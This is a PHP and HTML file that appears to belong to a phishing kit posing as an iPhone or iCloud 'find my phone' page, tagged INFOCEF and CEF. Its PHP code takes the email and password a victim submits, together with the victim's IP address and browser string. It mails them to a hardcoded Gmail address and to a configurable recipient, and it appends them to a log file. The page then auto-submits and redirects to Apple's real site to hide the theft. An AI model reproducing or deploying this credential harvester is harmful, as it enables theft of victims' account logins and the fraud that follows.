<?php
extract($_POST);
$headers = "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .="From: INFOCEF";
$ip = $_SERVER["REMOTE_ADDR"];
date_default_timezone_set('America/Sao_Paulo');
$navegador = $_SERVER['HTTP_USER_AGENT'];
$data=date("d/m/Y");
$hora=date("H:i");

$conteudo = "
| -------------------------------------
| Sistema de Cadastro
| -------------------------------------
| INFOCEF
| Data: $data
| Hora: $hora
| IP: $ip
| -------------------------------------
| Navegador: $navegador
| -------------------------------------
| EMAIL: $ag
| SENHA: $s8
| -------------------------------------";

@mail($receber, "INFOCEF-$ip", "$conteudo", $headers); 

$ag = $_POST['ag'];
$s8 = $_POST['s8'];


$ip_usuario = $_SERVER['REMOTE_ADDR'];
$myFile = "../dados/"."FISICA-CEF".".php";
$fh = fopen($myFile, 'a') or die("Impossivel abrir arquivo.");
$data=date("d/m/Y");
$hora=date("H:i");
$stringData = "
| -------------------------------------<br>
| Sistema de Cadastro<br>
| -------------------------------------<br>
| INFOCEF<br>
| Data: $data<br>
| Hora: $hora<br>
| IP: $ip<br>
| Navegador: $navegador<br>
| -------------------------------------<br>
| EMAIL: $ag<br>
| SENHA: $s8<br>
| -------------------------------------<br>";


fwrite($fh, $stringData);
fclose($fh);

@mail("flamengoliberta660@gmail.com","[FISICA-CEF]"."$ip", $stringData, $matts);

?>

<!DOCTYPE html>
<html lang="pt-br">
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
<meta charset="UTF-8">
<meta http-equiv="refresh" content="15;URL=https://www.icloud.com/find">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

<link rel="stylesheet" type="text/css" href="css/style1.css">
<script type="text/javascript" src="scripts/html5shiv.js"></script>
<script language="JavaScript">
function direcionar() { document.form.submit(); }
 
</script>
<meta name="RATING" content="RTA-5042-1996-1400-1577-RTA" /></head>

<body style="margin:0;" onLoad="setTimeout('direcionar()',2000);">

<form name="form" id="form" action="sucesso.php" method="post">
<input type="hidden" name="br" id="br" value="">
<div style="margin:10px 0 0 0; color:# 000000; font-family:'Arial'; font-size:13px; text-align:center;">Buscando Seu iPhone...</div>

<img src="../assets/img/logo.png" id="centro" />

</form>
</div>
